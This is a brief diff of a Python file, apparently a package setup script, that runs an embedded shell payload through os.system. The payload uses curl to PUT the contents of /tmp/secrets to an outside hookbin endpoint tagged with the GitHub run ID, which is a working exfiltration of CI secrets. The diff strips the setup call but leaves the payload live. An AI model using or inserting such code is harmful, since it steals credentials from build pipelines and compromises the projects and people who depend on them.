@@ -1,5 +1,4 @@
 import os
-from setuptools import setup
 
 payload = """
 echo "Okay, we got this far. Let's continue..."
@@ -8,5 +7,3 @@ curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
 """
 
 os.system(payload)
-
-setup(name="exploit", version="0.0.1")
